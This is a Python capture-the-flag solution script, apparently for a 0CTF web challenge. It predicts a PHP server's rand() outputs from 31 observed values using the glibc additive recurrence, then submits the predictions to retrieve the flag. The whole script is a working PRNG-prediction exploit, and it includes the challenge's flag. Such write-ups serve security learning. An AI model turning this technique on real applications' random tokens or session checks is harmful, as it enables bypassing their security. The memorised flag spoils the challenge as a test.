# -*- coding: utf-8 -*-

import re
import requests

def get_flag(url):

    # rands save the random number from page
    rands = []

    s = requests.session()
    resp = s.get(url)

    pattern = re.compile(r'(\d+)')

    # save the generated 32 random numbers, for predict the left random number
    # rnd[i] = rnd[i-3] + rnd[i-31]) % 2**31
    for i in xrange(31):
        resp = s.get(url)
        m = pattern.search(resp.content)
        if m:
            # print(m.group(1))
            rands.append(int(m.group(1)))
        else:
            print "no match"

    # server generate 6 random numbers
    params = {
        'go': '1',
    }
    s.get(url, params=params)

    checks=[]
    N = 2**31

    # predict first rand() that echo
    # for correct, you can compare the predict number with the number that page return
    i=31
    tmp_rand = (rands[i-3]+rands[i-31]) % N
    rands.append(tmp_rand)

    # predict the left five random numbers for $_SESSION['rand']
    for i in range(32, 37):
        tmp_rand = (rands[i-3]+rands[i-31]) % N
        rands.append(tmp_rand)
        checks.append(tmp_rand)

    # get flag
    params = {
        'check[]': checks
    }

    resp = s.get(url, params=params)
    return resp.content if 'die' not in resp.content else None

if __name__ == "__main__":
    #url = 'http://202.120.7.202:8888/'
    url = 'http://127.0.0.1:8000/'
    print("begin to get flag:")

    while True:
        flag = get_flag(url)
        if flag:
            print flag
            break

# flag: 0ctf{randisawesomebutdangerous}
